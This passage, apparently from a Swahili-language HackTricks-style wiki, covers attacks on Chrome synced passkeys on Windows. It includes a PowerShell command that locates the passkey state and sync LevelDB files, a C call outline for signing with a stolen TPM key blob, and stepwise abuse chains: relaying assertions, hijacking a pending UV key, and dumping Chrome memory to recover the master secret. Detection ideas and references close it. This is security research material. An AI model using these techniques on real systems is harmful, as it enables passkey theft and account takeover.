- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizosimbwa kwa protobuf. Mchakato unaoendeshwa na mtumiaji huyo huyo unaweza kupata **RP ID**, **username**, **credential ID**, na data ya private key iliyosimbwa ya passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** huhifadhi hali ya uandikishaji wa kifaa cha ndani, kama vile **`wrapped_identity_private_key`** na siri iliyofungwa inayotumiwa kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Tathmini ya haraka:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Key blobs zilizofungwa kwa TPM bado zinaweza kutumiwa vibaya kama oracle ya kusaini ya ndani

Ikiwa browser itahamisha key ya utambulisho inayotegemea TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blob hiyo katika hali inayoweza kufikiwa na mtumiaji, malware **haihitaji** kutoa key ya faragha ghafi. Inaweza tu kuingiza tena blob hiyo kwenye **mashine hiyohiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambulizi:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Hii inamaanisha **hardware binding huzuia kuhamisha nje ya kifaa, lakini haizuii matumizi na mtumiaji huyo huyo kwenye endpoint iliyoathiriwa**.

### Njia za matumizi mabaya kwa vitendo

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Orodhesha `WebauthnCredentialSpecifics` kutoka LevelDB ya Chrome.
   - Anzisha kuingia kwa passkey na upate changamoto mpya ya WebAuthn.
   - Tumia blob ya `wrapped_identity_private_key` iliyoibwa kwenye TPM ya mwathiriwa kusaini binding ya ombi la cloud-authenticator.
   - Peleka assertion iliyorejeshwa kwa relying party.
   - Hili lina thamani hasa ikiwa RP inakubali `userVerification=preferred` au inashindwa kukataa assertions zenye **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Lazimisha kuanzishwa upya kwa onboarding kwa kufuta `passkey_enclave_state` au kutuma operesheni halali iliyosainiwa ya `device/forget`.
   - Ikiwa onboarding itaacha kifaa katika hali ya **`uv_key_pending`**, sajili ufunguo wa umma wa UV unaodhibitiwa na mshambuliaji.
   - Ikiwa mtoa huduma hatathibitishi attestation / asili ya secure-hardware ya ufunguo mpya wa UV, saini za baadaye kutoka kwa ufunguo wa mshambuliaji zitachukuliwa kuwa **`UV=1`**.
3. **Wizi wa master-secret / SDS recovery**<sup>[[4]](#references)</sup>
   - Lazimisha recovery au kujiunga upya ili Chrome ipakue master secret ya synced-passkey.
   - Fuatilia uundaji upya/mabadiliko ya `passkey_enclave_state`, kisha dump kumbukumbu ya Chrome wakati **security domain secret (SDS)** iliyo katika hali ya maandishi wazi ipo humo.
   - Tumia SDS iliyorejeshwa kusimbua sehemu zilizosimbwa katika kila rekodi ya `WebauthnCredentialSpecifics` na kurejesha private keys za WebAuthn zinazoweza kuhamishwa.

### Mawazo ya DFIR / utambuzi

- Fuatilia **ufutaji/uundaji upya** wa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa tahadhari kuhusu ufikiaji usio wa kawaida wa Chrome **`Sync Data\LevelDB`** kutoka kwa michakato isiyo ya browser.
- Toa tahadhari kuhusu **dumps za kumbukumbu ya Chrome** au ufikiaji unaotiliwa shaka wa kumbukumbu kati ya michakato.
- Chunguza vidokezo vinavyojirudia vya **Google Password Manager recovery PIN** au kuanzishwa upya kwa onboarding kusikotarajiwa.
- Kumbuka kuwa WebAuthn **`signCount`** mara nyingi haina manufaa kwa synced passkeys kwa sababu inaweza kubaki bila kubadilika, hivyo ugunduzi wa clone wa kawaida huwa dhaifu.

## References

- [1] [Unit 42 – Uchunguzi wa operesheni za miaka mingi ambazo hazikugunduliwa, zilizolenga sekta zenye thamani kubwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa Word VBA macro kupitia SMTP → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua mtandao wa relay na jinsi operesheni fiche ya mashambulizi inavyofanya kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pitisha Passkey: Eneo jipya la mashambulizi katika uthibitishaji usiotumia nenosiri](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / hifadhi ya funguo ya CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Hifadhi ya Data ya Active Directory Inavyofanya Kazi: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Dump ya mbali ya Lsass kwa nywila](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho yaongeza zana zake za ujasusi wa mtandaoni kwa kutumia Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Kitendaji cha CreateFileW na `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Hali ya chelezo ya Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Maswali Yanayoulizwa Mara kwa Mara ya Telegram – kusitisha vipindi vinavyoendelea](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard na Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Ulinzi na usimamizi wa credentials](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
